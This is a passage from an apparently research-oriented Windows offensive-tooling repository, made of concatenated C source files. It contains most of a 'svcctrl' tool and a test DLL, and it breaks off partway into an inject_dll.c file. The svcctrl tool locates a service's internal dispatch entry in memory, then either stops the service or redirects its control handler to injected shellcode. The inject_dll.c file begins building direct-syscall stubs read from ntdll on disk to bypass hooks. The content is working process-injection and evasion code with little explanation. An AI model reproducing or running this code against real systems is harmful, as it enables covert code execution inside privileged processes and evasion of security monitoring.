    DWORD64                 ServiceFlags;        // 64-bit on windows 10
    DWORD64                 Tag;
    HANDLE                  MainThreadHandle;
    DWORD64                 dwReserved;
    DWORD64                 dwReserved2;
} INTERNAL_DISPATCH_ENTRY, *PINTERNAL_DISPATCH_ENTRY;
#endif

typedef struct _SERVICE_ENTRY {
  INTERNAL_DISPATCH_ENTRY ide;               // copy of IDE
  WCHAR                   svcName[MAX_PATH];
  WCHAR                   svcReal[MAX_PATH];
  LPVOID                  ide_addr;          // remote address of IDE
  WCHAR                   service[MAX_PATH]; // name of service
  DWORD                   tid;               // thread id belonging to service
  DWORD                   pid;               // process id hosting service
  WCHAR                   process[MAX_PATH]; // process name hosting service
  BOOL                    bAll;
  HANDLE                  hThread;
} SERVICE_ENTRY, *PSERVICE_ENTRY;

typedef struct _INTERNAL_DISPATCH_TABLE {
    LIST_ENTRY              DispatchEntryHead;
    INTERNAL_DISPATCH_ENTRY DispatchEntry;
} INTERNAL_DISPATCH_TABLE, *PINTERNAL_DISPATCH_TABLE;

BOOL StopService(PSERVICE_ENTRY se){
    DWORD                   evt;
    HANDLE                  hThread, hProcess;
    RtlCreateUserThread_t   pRtlCreateUserThread;
    BOOL                    bResult=FALSE;
    
    wprintf(L"[*] Attempting to stop service...\n");
      
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, se->pid);
    
    if(hProcess == NULL) {
      xstrerror(L"StopService::OpenProcess");
      return 0;
    }
    // resolve address of RtlCreateUserThread
    // CreateRemoteThread won't work here..
    pRtlCreateUserThread=
      (RtlCreateUserThread_t)GetProcAddress(
      LoadLibrary(L"ntdll"), "RtlCreateUserThread");

    // got it?
    if (pRtlCreateUserThread!=NULL) {
      // execute the ControlHandler in remote process space
      pRtlCreateUserThread(hProcess, NULL, FALSE,
          0, NULL, NULL, se->ide.ControlHandler,
          (LPVOID)SERVICE_CONTROL_STOP, &hThread, NULL);

      bResult = (hThread != NULL);
      
      // if thread created
      if (bResult) {
        // wait 5 seconds for termination
        evt = WaitForSingleObject(hThread, 5*1000);
        bResult = (evt == WAIT_OBJECT_0);
        
        CloseHandle(hThread);
      }
      wprintf(L"[*] Service %s stopped.\n", 
        bResult ? L"successfully" : L"unsuccessfully");
    }
    CloseHandle(hProcess);
    return bResult;
}

VOID SvcCtrlInject(PSERVICE_ENTRY se, LPVOID payload, DWORD payloadSize) {
    SIZE_T                  wr;
    SC_HANDLE               hm, hs;
    INTERNAL_DISPATCH_ENTRY ide;
    HANDLE                  hp;
    LPVOID                  cs;
    SERVICE_STATUS          ss;
    
    wprintf(L"[*] Attempting to inject PIC into \"%s\"...\n", se->process);
    
    // open the service control manager
    hm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hm != NULL) {
      // open target service
      hs = OpenService(hm, se->service, SERVICE_INTERROGATE);
      if (hs != NULL) {
        // open target process
        hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, se->pid);
        if (hp != NULL) {
          // allocate memory for payload
          cs = VirtualAllocEx(hp, NULL, payloadSize, 
            MEM_COMMIT, PAGE_EXECUTE_READWRITE);
          if (cs) {
            // write payload to process space
            WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
            // create backup of IDE
            memcpy(&ide, &se->ide, sizeof(ide));
            // point ControlHandler to payload
            ide.ControlHandler = cs;
            // change flags
            ide.ServiceFlags   = SERVICE_CONTROL_INTERROGATE;
            // update IDE in remote process
            WriteProcessMemory(hp, se->ide_addr, &ide, sizeof(ide), &wr);
            // trigger payload
            wprintf(L"[*] Set a breakpoint on %p\n", cs);
            getchar();
            ControlService(hs, SERVICE_CONTROL_INTERROGATE, &ss);
            xstrerror(L"ControlService");
            // free payload from memory
            VirtualFreeEx(hp, cs, payloadSize, MEM_RELEASE);
            // restore original IDE
            WriteProcessMemory(hp, se->ide_addr, 
              &se->ide, sizeof(ide), &wr);
          } else xstrerror(L"VirtualAllocEx");
          CloseHandle(hp);      // close process
        } else xstrerror(L"OpenProcess");
        CloseServiceHandle(hs); // close service
      } else xstrerror(L"OpenService");
      CloseServiceHandle(hm);   // close manager
    }
}

BOOL GetProcessImageName(DWORD dwPid, 
  LPWSTR ImageName, DWORD dwSize) 
{
    HANDLE         hSnap;
    PROCESSENTRY32 pe32;
    BOOL           bFound=FALSE;
    
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return 0;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // get first process
    if(Process32First(hSnap, &pe32)){
      do {
        if(dwPid == pe32.th32ProcessID) {
          lstrcpyn(ImageName, pe32.szExeFile, dwSize);
          bFound = TRUE;
          break;
        }
      } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    return bFound;
}

DWORD GetServicePid(IWbemServices *svc, PWCHAR targetService) {
    IEnumWbemClassObject *e   = NULL;
    IWbemClassObject     *obj = NULL;
    ULONG                cnt;
    VARIANT              v;
    HRESULT              hr;
    DWORD                pid = 0;
    
    // obtain list of Win32_Service instances
    hr = svc->lpVtbl->CreateInstanceEnum(svc,
        L"Win32_Service", 
        WBEM_FLAG_RETURN_IMMEDIATELY | 
        WBEM_FLAG_FORWARD_ONLY, NULL, &e); 

    if (SUCCEEDED(hr)) {
      // loop through each one
      for (;;) {
        cnt = 0;
        hr  = e->lpVtbl->Next(e, INFINITE, 1, &obj, &cnt);

        if (cnt == 0) break;

        VariantInit (&v);

        // get the name of service
        hr = obj->lpVtbl->Get(obj, L"Name", 0, &v, NULL, NULL);

        if (SUCCEEDED(hr)) {
          // does it match target service name?
          if (lstrcmpi(targetService, V_BSTR(&v)) == 0) {
            // retrieve the process id
            hr = obj->lpVtbl->Get(obj, 
                L"ProcessID", 0, &v, NULL, NULL);
                
            if (SUCCEEDED(hr)) {
              pid = V_UI4(&v);
              break;
            }
          }
        }
        VariantClear(&v);
        obj->lpVtbl->Release(obj);
      }
      e->lpVtbl->Release(e); 
      e = NULL;
    }
    return pid;
}

// return a process id for service
BOOL GetServiceInfo(PSERVICE_ENTRY ste) {
    IWbemLocator  *loc = NULL;
    IWbemServices *svc = NULL;
    HRESULT       hr;
    
    // initialize COM
    hr = CoInitializeEx (NULL, COINIT_MULTITHREADED);
      
    if (SUCCEEDED(hr)) {
      // setup security
      hr = CoInitializeSecurity(
          NULL, -1, NULL, NULL, 
          RPC_C_AUTHN_LEVEL_DEFAULT, 
          RPC_C_IMP_LEVEL_IMPERSONATE, 
          NULL, EOAC_NONE, NULL);
        
      if (SUCCEEDED(hr)) {
        // create locator
        hr = CoCreateInstance (
          &CLSID_WbemLocator, 
          0, CLSCTX_INPROC_SERVER, 
          &IID_IWbemLocator, (LPVOID*)&loc);
              
        if (SUCCEEDED(hr)) {
          // connect to service
          hr = loc->lpVtbl->ConnectServer(
            loc, L"root\\cimv2", 
            NULL, NULL, NULL, 0, 
            NULL, NULL, &svc);
            
          if (SUCCEEDED(hr)) {
            // get the process id
            ste->pid = GetServicePid(svc, ste->service);
            // get the process name
            GetProcessImageName(ste->pid, ste->process, MAX_PATH);
            // release service object
            svc->lpVtbl->Release(svc);
            svc = NULL;
          }
          // release locator object
          loc->lpVtbl->Release(loc);
          loc = NULL;
        }
      }
      CoUninitialize();
    }
    return ste->pid != 0;
}

// display values of the dispatch entry
VOID DisplayIDE(PSERVICE_ENTRY ste) {
    WCHAR         path[MAX_PATH];
    BYTE          buffer[sizeof(SYMBOL_INFO)+MAX_SYM_NAME*sizeof(WCHAR)];
    PSYMBOL_INFO  pSymbol=(PSYMBOL_INFO)buffer;
    HANDLE        hp;
    
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ste->pid);
    SymInitialize(hp, NULL, TRUE);
    
    wprintf(L"ServiceName         : %p (%s)\n",  
      ste->ide.ServiceName, ste->svcName);
      
    wprintf(L"ServiceRealName     : %p (%s)\n",  
      ste->ide.ServiceRealName, ste->svcReal);
    
    ZeroMemory(path, ARRAYSIZE(path));
    
    GetMappedFileName(hp, 
      (LPVOID)ste->ide.ServiceStartRoutine, 
      path, MAX_PATH);
      
    PathStripPath(path);
    
    wprintf(L"ServiceStartRoutine : %p : %s",  
      ste->ide.ServiceStartRoutine, path);
          
    pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
    pSymbol->MaxNameLen   = MAX_SYM_NAME;
    
    if(SymFromAddr(hp, 
      (DWORD64)ste->ide.ServiceStartRoutine, 
      NULL, pSymbol)) 
    {
      wprintf(L"!%hs", pSymbol->Name);
    }
    putchar('\n');
    
    // display ControlHandler
    ZeroMemory(path, ARRAYSIZE(path));
    
    GetMappedFileName(hp, 
      (LPVOID)ste->ide.ControlHandler, 
      path, MAX_PATH);
      
    PathStripPath(path);
    
    wprintf(L"ControlHandler      : %p : %s",  
      ste->ide.ControlHandler, path);
    
    pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
    pSymbol->MaxNameLen   = MAX_SYM_NAME;
    
    if(SymFromAddr(hp, 
      (DWORD64)ste->ide.ControlHandler, 
      NULL, pSymbol)) 
    {
      wprintf(L"!%hs", pSymbol->Name);
    }
    putchar('\n');
    
    wprintf(L"StatusHandle        : %p\n",  
      ste->ide.StatusHandle);
    
    wprintf(L"ServiceFlags        : %p\n",  
      (void*)ste->ide.ServiceFlags);
    
    wprintf(L"Tag                 : %p\n",  
      (void*)ste->ide.Tag);
    
    wprintf(L"MainThreadHandle    : %p (%d) (use with -t option)\n\n",
      (void*)ste->ide.MainThreadHandle, 
      (int)ste->ide.MainThreadHandle);
      
    SymCleanup(hp);
    CloseHandle(hp);
}
      
// validates a windows service IDE
BOOL IsValidIDE(HANDLE hProcess, PSERVICE_ENTRY ste) {
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T                   rd;
    DWORD                    res;
    
    // these values shouldn't be empty
    if (ste->ide.ServiceName         == NULL || 
        ste->ide.ServiceRealName     == NULL ||
        ste->ide.ServiceStartRoutine == NULL ||
        ste->ide.ControlHandler      == NULL ||
        ste->ide.MainThreadHandle    == NULL) return FALSE;
    
    // string pointers should be equal
    if (ste->ide.ServiceName != 
        ste->ide.ServiceRealName) return FALSE;
    
    // service flags shouldn't exceed 128
    if (ste->ide.ServiceFlags > 128) return FALSE;
    
    // check main thread handle
    if (ste->ide.MainThreadHandle > (HANDLE)0xFFFF) return FALSE;
    
    // the start routine should reside
    // in executable memory.
    res = VirtualQueryEx(hProcess, 
      ste->ide.ServiceStartRoutine, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_EXECUTE_READ)) return FALSE;

    // the control handler should reside
    // in executable memory.
    res = VirtualQueryEx(hProcess, 
      ste->ide.ControlHandler, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_EXECUTE_READ)) return FALSE;
    
    // try read the service name 
    if (!ReadProcessMemory(hProcess, 
        ste->ide.ServiceName, ste->svcName, 
        MAX_PATH, &rd)) return FALSE;
       
    // try read the service real name
    if (!ReadProcessMemory(hProcess, 
        ste->ide.ServiceRealName, ste->svcReal, 
        MAX_PATH, &rd)) return FALSE;
    
    return TRUE;
}

BOOL FindServiceIDE(HANDLE hProcess, 
  LPVOID BaseAddress, DWORD RegionSize, PSERVICE_ENTRY ste) 
{
    LPBYTE addr = BaseAddress;
    DWORD  pos, res;
    BOOL   bRead, bFound = FALSE;
    SIZE_T rd;
    
    // scan memory for IDE
    for (pos = 0; 
         pos <= (RegionSize - sizeof(INTERNAL_DISPATCH_ENTRY));
         pos += sizeof(ULONG_PTR)) 
    {
      // try read an internal dispatch entry
      bRead = ReadProcessMemory(hProcess, 
        &addr[pos], &ste->ide, 
        sizeof(INTERNAL_DISPATCH_ENTRY), &rd);
      
      if (bRead && rd == sizeof(INTERNAL_DISPATCH_ENTRY)) {
        if (IsValidIDE(hProcess, ste)) {
          // if we're searching for all services
          // display the entry we found
          if (ste->bAll) {
            wprintf(L"[+] Found IDE at address: %p.\n\n", addr+pos);
        
            DisplayIDE(ste);
            
          } else {
            // save the position of IDE
            ste->ide_addr = addr + pos;
            // if we have a thread handle, validate by this value
            if (ste->hThread != 0) {
              bFound = (ste->ide.MainThreadHandle == ste->hThread);
            } else {
            // otherwise, compare with service name instead           
              bFound = (lstrcmpi(ste->service, ste->svcName)==0);
            }
            if (bFound) break;
          }
        }
      }
    }
    return bFound;
}

BOOL GetServiceIDE(PSERVICE_ENTRY ste) {
    HANDLE                   hProcess;
    SYSTEM_INFO              si;
    MEMORY_BASIC_INFORMATION mbi;
    LPBYTE                   addr;     // current address
    ULONG_PTR                ptr;
    DWORD                    res;
    BOOL                     bFound = FALSE;
    
    // get the name and id of process hosting service
    if (!GetServiceInfo(ste)) {
      printf("Unable to obtain service information.\n");
      ste->pid = name2pid(ste->service);
      if(ste->pid == 0) {
        ste->pid = wcstoull(ste->service, NULL, 10);
        if(ste->pid == 0) {
          printf("Unable to obtain process id.\n");
          return FALSE;
        }
      }
    }
    
    wprintf(L"Process id for %s is %ld\n", ste->service, ste->pid);
    
    // try open the host process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ste->pid);
    
    // if process opened
    if (hProcess != NULL) {
      // get memory info
      GetSystemInfo(&si);
      
      for (addr=0; addr < si.lpMaximumApplicationAddress;) {
        ZeroMemory(&mbi, sizeof(mbi));
        res = VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi));

        // we only want to scan the heap, but this will scan stack space too.
        if ((mbi.State   == MEM_COMMIT)  &&
            (mbi.Type    == MEM_PRIVATE) && 
            (mbi.Protect == PAGE_READWRITE)) 
        {
          bFound = FindServiceIDE(hProcess, 
            mbi.BaseAddress, mbi.RegionSize, ste);
          if (bFound) break;
        }
        addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
      }
      CloseHandle(hProcess);
    }
    return bFound;
}

// this is never called. just an address to compare with
int WINAPI ServiceMain(DWORD dwNumServicesArgs, LPWSTR *lpServiceArgVectors) {
  return dwNumServicesArgs * 4;
}

LPVOID GetDispatchTable(VOID) {
    LPVOID                   m, va = NULL;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_SECTION_HEADER    sh;
    DWORD                    i, cnt;
    PULONG_PTR               ds;
    PINTERNAL_DISPATCH_TABLE dt;
    
    // fake service 
    SERVICE_TABLE_ENTRY svcTable[] = {
      { L"", ServiceMain },
      { NULL, NULL }};
    
    // this will create the dispatch table but won't execute ServiceMain
    StartServiceCtrlDispatcher(svcTable);
    
    // now search the .data segment of sechost.dll for the table
    m   = GetModuleHandle(L"sechost.dll");
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
          nt->FileHeader.SizeOfOptionalHeader);
          
    // locate the .data segment, save VA and number of pointers
    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(*(PDWORD)sh[i].Name == *(PDWORD)".data") {
        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
        break;
      }
    }
    // for each pointer
    for(i=0; i<cnt; i++) {
      // not a heap pointer? skip it
      if(!IsHeapPtr((LPVOID)ds[i])) continue;
      
      dt = (PINTERNAL_DISPATCH_TABLE)ds[i];

      // contains our function?
      if(dt->DispatchEntry.ServiceStartRoutine == (LPVOID)ServiceMain) {
        // return RVA of dispatch table
        va = (LPVOID)((PBYTE)&ds[i] - (PBYTE)m);
        break;
      }
    }
    return va;
}

VOID usage(VOID){
    wprintf(L"\nusage: svcctrl -[options] <service name>\n\n");
    wprintf(L"        -l          : display all IDE found for process scanned\n");
    wprintf(L"        -i <pic>    : inject a payload into host process using service\n");
    wprintf(L"        -t <handle> : validate by thread handle instead of service name\n");
    wprintf(L"        -s          : stop service\n");
    exit(0);
}

int main(void) {
    PWCHAR        *argv, service=NULL, pfile=NULL;
    int           argc, i;
    WCHAR         opt;
    BOOL          bInject=FALSE, bStop=FALSE, bFound=FALSE, bAll=FALSE;
    SERVICE_ENTRY ste;
    DWORD         thread=0, payloadSize=0;
    LPVOID        payload=NULL;
    
    // get parameters
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    
    for(i=1; i<=argc-1; i++){
      // is this a switch?
      if(argv[i][0]==L'/' || argv[i][0]==L'-'){
        // check it out
        switch(argv[i][1]) {
          case L'l':
            bAll=TRUE;
            break;
          case L's':
            bStop=TRUE;
            break;
          case L'i':
            bInject=TRUE;
            pfile = argv[++i];
            break;
          case L't':
            thread = wcstoull(argv[++i], NULL, 10);
            break;
          case L'?':
          case L'h':
          default:
            usage();
            break;
        }
      } else if (service==NULL) {
        service = argv[i];
      } else {
        usage();
      }
    }
    // if no service, display usage
    if (service == NULL) {
      wprintf(L"[-] No service specified.\n");
      usage();
    }
      
    // if both inject and stop, throw an error
    if (bInject & bStop) {
      wprintf(L"[-] Injecting and stopping a service simultaneously isn't supported.\n");
      return 0;
    }
    
    if (bInject && pfile == NULL) {
      wprintf(L"[-] No PIC file specified for injection.\n");
      return 0;
    }
    
    if (pfile != NULL) {
      // try read pic
      payloadSize = readpic(pfile, &payload);
      if (payloadSize == 0) { 
        wprintf(L"[-] Unable to read PIC from %s\n", pfile); 
        return 0; 
      }
    }
    
    // if not elevated, display warning
    if(!IsElevated())
      wprintf(L"[*] WARNING: This requires elevated privileges!.\n");
    
    // try enable debug privilege
    if(!SetPrivilege(SE_DEBUG_NAME, TRUE)){
      wprintf(L"[-] Unable to enable SeDebugPrivilege.\n");
      return 0;
    }
    
    SymSetOptions(SYMOPT_DEFERRED_LOADS);
    
    ZeroMemory(&ste, sizeof(ste));    
    lstrcpyn(ste.service, service, MAX_PATH);
    
    ste.bAll    = bAll;
    ste.hThread = (HANDLE)thread;
    
    // now try find the IDE for service
    if (GetServiceIDE(&ste)) {
      wprintf(L"[+] Found IDE for \"%s\" in %s:%i at address: %p.\n\n", 
        ste.service, ste.process, ste.pid, ste.ide_addr);

      DisplayIDE(&ste);
        
      // stopping?
      if (bStop) {
        StopService(&ste);
      } else 
      // injecting?
      if (bInject) {    
        SvcCtrlInject(&ste, payload, payloadSize);
      } else {
        wprintf(L"[*] No action specified.\n");
      }
    } else {
      if (!ste.bAll) {
        wprintf(L"[*] Try using -l option to list potential entries.\n");
      }
    }
    return 0;
}


```

`syscalls/hello.c`:

```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#pragma comment(lib, "user32.lib")

__declspec(dllexport)
BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD ul_reason_for_call,
                      LPVOID lpReserved) {
  switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
      MessageBox(NULL, "Hello world!", "Hello World!", 0);
      break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
      break;
  }
  return TRUE;
}

```

`syscalls/inject_dll.c`:

```c
/**
  Copyright © 2019-2020 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#ifndef _WIN64
#error This code must be compiled with a 64-bit version of MSVC
#endif

// compile: cl inject_dll.c
//
#include <windows.h>
#include <tlhelp32.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")
#pragma warning(disable : 4047)

#define STATUS_SUCCESS 0
#define OBJ_CASE_INSENSITIVE 0x00000040L
#define FILE_OVERWRITE_IF 0x00000005
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
typedef LONG KPRIORITY;

#define InitializeObjectAttributes( i, o, a, r, s ) {    \
      (i)->Length = sizeof( OBJECT_ATTRIBUTES );         \
      (i)->RootDirectory = r;                            \
      (i)->Attributes = a;                               \
      (i)->ObjectName = o;                               \
      (i)->SecurityDescriptor = s;                       \
      (i)->SecurityQualityOfService = NULL;              \
   }

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef const UNICODE_STRING* PCUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation,
	SystemProcessorInformation,
	SystemPerformanceInformation,
	SystemTimeOfDayInformation,
	SystemPathInformation,
	SystemProcessInformation,
	SystemCallCountInformation,
	SystemDeviceInformation,
	SystemProcessorPerformanceInformation,
	SystemFlagsInformation,
	SystemCallTimeInformation,
	SystemModuleInformation
} SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESSES {
	ULONG NextEntryDelta;
	ULONG ThreadCount;
	ULONG Reserved1[6];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;
	KPRIORITY BasePriority;
	HANDLE ProcessId;
	HANDLE InheritedFromProcessId;
} SYSTEM_PROCESSES, *PSYSTEM_PROCESSES;

typedef struct _IO_STATUS_BLOCK
{
	union
	{
		LONG Status;
		PVOID Pointer;
	};
	ULONG Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;


typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
	HANDLE             ProcessHandle,
	PVOID             *BaseAddress,
	ULONG_PTR          ZeroBits,
	PSIZE_T            RegionSize,
	ULONG              AllocationType,
	ULONG              Protect);

typedef NTSTATUS (NTAPI *NtFreeVirtualMemory_t)(
	HANDLE             ProcessHandle,
	PVOID             *BaseAddress,
	IN OUT PSIZE_T     RegionSize,
	ULONG              FreeType);

typedef NTSTATUS (NTAPI *NtOpenProcess_t)(
	PHANDLE            ProcessHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PCLIENT_ID         ClientId);
  
typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(
	HANDLE             hProcess,
	PVOID              lpBaseAddress,
	PVOID              lpBuffer,
	SIZE_T             NumberOfBytesToRead,
	PSIZE_T            NumberOfBytesRead);
  
typedef NTSTATUS (NTAPI *NtCreateThreadEx_t) (
  PHANDLE            ThreadHandle, 
  ACCESS_MASK        DesiredAccess, 
  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, 
  HANDLE             ProcessHandle,
  PVOID              StartRoutine,
  PVOID              Argument OPTIONAL,
  ULONG              CreateFlags,
  ULONG_PTR          ZeroBits, 
  SIZE_T             StackSize OPTIONAL,
  SIZE_T             MaximumStackSize OPTIONAL, 
  PVOID              AttributeList OPTIONAL);
    
typedef NTSTATUS (NTAPI *NtWaitForSingleObject_t)(
  HANDLE             ObjectHandle,
  BOOLEAN            Alertable,
  PLARGE_INTEGER     TimeOut OPTIONAL); 
  
typedef NTSTATUS (NTAPI *NtClose_t)(
  HANDLE             ObjectHandle);
  
typedef struct _syscall_t {
    NtOpenProcess_t           NtOpenProcess;
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
    NtWriteVirtualMemory_t    NtWriteVirtualMemory;
    NtCreateThreadEx_t        NtCreateThreadEx;
    NtWaitForSingleObject_t   NtWaitForSingleObject;
    NtFreeVirtualMemory_t     NtFreeVirtualMemory;
    NtClose_t                 NtClose;
} syscall_t;

ULONG64 rva2ofs(PIMAGE_NT_HEADERS nt, DWORD rva) {
    PIMAGE_SECTION_HEADER sh;
    int                   i;
    
    if(rva == 0) return -1;
    
    sh = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
           nt->FileHeader.SizeOfOptionalHeader);
    
    for(i = nt->FileHeader.NumberOfSections - 1; i >= 0; i--) {
      if(sh[i].VirtualAddress <= rva &&
        rva <= (DWORD)sh[i].VirtualAddress + sh[i].SizeOfRawData)
      {
        return sh[i].PointerToRawData + rva - sh[i].VirtualAddress;
      }
    }
    return -1;
}

LPVOID GetProcAddress2(LPBYTE hModule, LPCSTR lpProcName) {
    PIMAGE_DOS_HEADER       dos;
    PIMAGE_NT_HEADERS       nt;
    PIMAGE_SECTION_HEADER   sh;
    PIMAGE_DATA_DIRECTORY   dir;
    PIMAGE_EXPORT_DIRECTORY exp;
    DWORD                   rva, ofs, cnt, nos;
    PCHAR                   str;
    PDWORD                  adr, sym;
    PWORD                   ord;
    
    if(hModule == NULL || lpProcName == NULL) return NULL;
    
    dos = (PIMAGE_DOS_HEADER)hModule;
    nt  = (PIMAGE_NT_HEADERS)(hModule + dos->e_lfanew);
    dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
    
    // no exports? exit
    rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if(rva == 0) return NULL;
    
    ofs = rva2ofs(nt, rva);
    if(ofs == -1) return NULL;
    
    // no exported symbols? exit
    exp = (PIMAGE_EXPORT_DIRECTORY)(ofs + hModule);
    cnt = exp->NumberOfNames;
    if(cnt == 0) return NULL;
    
    // read the array containing address of api names
    ofs = rva2ofs(nt, exp->AddressOfNames);        
    if(ofs == -1) return NULL;
    sym = (PDWORD)(ofs + hModule);

    // read the array containing address of api
    ofs = rva2ofs(nt, exp->AddressOfFunctions);        
    if(ofs == -1) return NULL;
    adr = (PDWORD)(ofs + hModule);
    
    // read the array containing list of ordinals
    ofs = rva2ofs(nt, exp->AddressOfNameOrdinals);
    if(ofs == -1) return NULL;
    ord = (PWORD)(ofs + hModule);
    
    // scan symbol array for api string
    do {
      str = (PCHAR)(rva2ofs(nt, sym[cnt - 1]) + hModule);
      // found it?
      if(lstrcmp(str, lpProcName) == 0) {
        // return the address
        return (LPVOID)(rva2ofs(nt, adr[ord[cnt - 1]]) + hModule);
      }
    } while (--cnt);
    return NULL;
}

#define NTDLL_PATH "%SystemRoot%\\system32\\NTDLL.dll"

LPVOID GetSyscallStub(LPCSTR lpSyscallName) {
    HANDLE                        file = NULL, map = NULL;
    LPBYTE                        mem = NULL;
    LPVOID                        cs = NULL;
    PIMAGE_DOS_HEADER             dos;
    PIMAGE_NT_HEADERS             nt;
    PIMAGE_DATA_DIRECTORY         dir;
    PIMAGE_RUNTIME_FUNCTION_ENTRY rf;
    ULONG64                       ofs, start=0, end=0, addr;
    SIZE_T                        len;
    DWORD                         i, rva;
    CHAR                          path[MAX_PATH];
    
    ExpandEnvironmentStrings(NTDLL_PATH, path, MAX_PATH);
    
    // open file
    file = CreateFile(path, 
      GENERIC_READ, FILE_SHARE_READ, NULL, 
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      
    if(file == INVALID_HANDLE_VALUE) { goto cleanup; }
    
    // create mapping
    map = CreateFileMapping(file, NULL, PAGE_READONLY, 0, 0, NULL);
    if(map == NULL) { goto cleanup; }
    
    // create view
    mem = (LPBYTE)MapViewOfFile(map, FILE_MAP_READ, 0, 0, 0);
    if(mem == NULL) { goto cleanup; }
    
    // try resolve address of system call
    addr = (ULONG64)GetProcAddress2(mem, lpSyscallName);
    if(addr == 0) { goto cleanup; }
    
    dos = (PIMAGE_DOS_HEADER)mem;
    nt  = (PIMAGE_NT_HEADERS)((PBYTE)mem + dos->e_lfanew);
    dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
    
    // no exception directory? exit
    rva = dir[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    if(rva == 0) { goto cleanup; }
    
    ofs = rva2ofs(nt, rva);
    if(ofs == -1) { goto cleanup; }
    
    rf = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(ofs + mem);

    // for each runtime function (there might be a better way??)
    for(i=0; rf[i].BeginAddress != 0; i++) {
      // is it our system call?
      start = rva2ofs(nt, rf[i].BeginAddress) + (ULONG64)mem;
      if(start == addr) {
        // save the end and calculate length
